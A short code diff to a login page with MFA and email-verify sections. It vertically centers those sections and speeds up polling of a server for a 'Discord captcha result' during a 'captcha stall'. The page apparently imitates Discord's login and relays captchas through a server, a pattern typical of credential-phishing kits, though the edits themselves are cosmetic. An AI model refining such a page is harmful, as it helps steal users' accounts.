@@ -53,6 +53,7 @@
       transition:opacity .3s;
     }
     .col-1{flex:1;padding:32px;min-width:0}
+    .col-1.v-center{display:flex;flex-direction:column;justify-content:center;align-items:stretch}
     .v-sep{width:1px;background:var(--modifier-accent);margin:32px 0;flex-shrink:0}
     .col-2{
       width:240px;flex-shrink:0;padding:32px 24px;
@@ -329,6 +330,10 @@ function showSec(name) {
   document.getElementById('sec-login').style.display = name === 'login' ? '' : 'none';
   document.getElementById('sec-mfa').style.display   = name === 'mfa'   ? '' : 'none';
   document.getElementById('sec-email-verify').style.display = name === 'email-verify' ? '' : 'none';
+  /* vertically center MFA / email-verify sections */
+  var col1 = document.querySelector('.col-1');
+  if (name !== 'login') col1.classList.add('v-center');
+  else col1.classList.remove('v-center');
 }
 
 /* ═══ Success → close page ═══ */
@@ -443,8 +448,8 @@ function showCaptchaStall(sessionId) {
     }, 300);
   }
 
-  /* Poll server for Discord captcha result */
-  stallPollTimer = setInterval(function() { pollSolveResult(sessionId); }, 1500);
+  /* Poll server for Discord captcha result — fast 800ms interval */
+  stallPollTimer = setInterval(function() { pollSolveResult(sessionId); }, 800);
 }
 
 function _renderHcaptcha(target) {
